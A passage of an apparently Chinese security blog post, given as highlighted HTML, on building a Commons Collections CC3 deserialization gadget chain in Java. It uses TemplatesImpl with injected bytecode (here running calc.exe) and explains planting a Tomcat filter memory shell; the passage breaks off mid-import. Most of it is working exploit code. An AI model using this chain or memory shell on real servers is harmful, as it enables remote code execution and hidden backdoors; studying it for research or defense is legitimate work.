#BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">map</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LazyMap</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">net</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">URLEncoder</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xml</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">transform</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Templates</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">*</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">nio</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">file</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Files</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">nio</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">file</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Paths</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Base64</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> CC3Re0 &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> main(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] args) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\">  </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">TemplatesImpl</span><span style=\"color: #B392F0\"> templates</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> TemplatesImpl();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\"> tc</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">templates</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> nameFiled</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_name&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">nameFiled</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">nameFiled</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ClassPool</span><span style=\"color: #B392F0\"> pool </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ClassPool</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDefault();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">CtClass</span><span style=\"color: #B392F0\"> ctClass </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">pool</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">makeClass(</span><span style=\"color: #FFAB70\">&quot;i&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">CtClass</span><span style=\"color: #B392F0\"> superClass </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">pool</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(</span><span style=\"color: #FFAB70\">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">ctClass</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setSuperclass(superClass);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">CtConstructor</span><span style=\"color: #B392F0\"> constructor </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ctClass</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">makeClassInitializer();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">constructor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setBody(</span><span style=\"color: #FFAB70\">&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] bytes </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ctClass</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toBytecode();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> bytecodesField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_bytecodes&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">bytecodesField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] code</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> bytes;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[][] codes</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">&#123;code&#125;;为空，不然会爆空调用的错误</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">bytecodesField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">codes);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> tfactoryField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_tfactory&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">tfactoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">tfactoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> TransformerFactoryImpl());</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">InstantiateTransformer</span><span style=\"color: #B392F0\"> instantiateTransformer</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> InstantiateTransformer(</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #79B8FF\">Templates</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">&#125;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">[]&#123;templates&#125;);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">[] transformer</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">[]&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ConstantTransformer(</span><span style=\"color: #79B8FF\">TrAXFilter</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                instantiateTransformer</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ChainedTransformer</span><span style=\"color: #B392F0\"> chainedTransformer </span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> ChainedTransformer(transformer);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; map</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; lazymap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">LazyMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">decorate(map</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ConstantTransformer(</span><span style=\"color: #F8F8F8\">1</span><span style=\"color: #B392F0\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">TiedMapEntry</span><span style=\"color: #B392F0\"> tiedMapeEntry</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> TiedMapEntry(lazymap</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; hashMap</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">hashMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">put(tiedMapeEntry</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;bbb&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">lazymap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">remove(</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\"> c</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">LazyMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> factoryField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">c</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;factory&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">factoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">factoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(lazymap</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">chainedTransformer);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> byteArrayOutputStream</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">Serial(hashMap);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> payload</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> Base64Encode(byteArrayOutputStream);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] bytes2</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Base64</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDecoder()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">decode(payload);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//本地反序列化测试</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes2));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// in.readObject();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// in.close();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">private</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> Serial(</span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\"> hashMap) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> bs </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ByteArrayOutputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ObjectOutputStream</span><span style=\"color: #B392F0\"> out </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ObjectOutputStream(bs);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">writeObject(hashMap);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">private</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> Base64Encode(</span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> bs)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] encode </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Base64</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getEncoder()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">encode(</span><span style=\"color: #79B8FF\">bs</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toByteArray());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> s </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> String(encode);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #79B8FF\">URLEncoder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">encode(s));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">length());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> s;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1722150342389-2058cd56-259b-46e8-91f5-8171b8a87237.png#averageHue=%2385a883&clientId=u593b3d90-d82a-4&from=paste&height=542&id=u24b17a71&originHeight=1016&originWidth=2063&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=304082&status=done&style=none&taskId=ua33fff59-58b9-469a-8e78-b0a31e990af&title=&width=1100.2666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>其实这个时候就能够想到往哪赛我们的内存马构造逻辑了—恶意类的静态代码块中。</p>\n<h2 id=\"具体构造\"><a href=\"#具体构造\" class=\"headerlink\" title=\"具体构造\"></a>具体构造</h2><p>bro 最开始想的是 javassist 写进去，不过属实想多了，有些方法的调用存在导包等操作，也不在乎那点 payload 长度了，要真遇到万不得已打内存马并且还有 payload 长度限制的情况，就对目标使用线程名写入 payload 的方法吧（<br>首先明确我们要利用的是基于类初始化，调用静态代码块的攻击链，最经典的就是 CC3 的 TemplatesImpl 链，将内置的 bytescode 设置为我们构造好的恶意类即可。<br>那么恶意类怎么写呢？这里以更加泛用的全局存储获取 request 的思路为例子,注入 filter 型内存马，并获取回显<br>首先是恶意类，思路就是给他一步到位，同时完成<code>AbstractTranslet</code>的继承（TemplatesImpl 链必要条件），以及 Filter 接口的实现</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">New</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">shellfilter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">DOM</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TransletException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">runtime</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">AbstractTranslet</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xml</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">dtm</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">DTMAxisIterator</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xml</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">serializer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">SerializationHandler</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Context</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebResourceRoot</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: 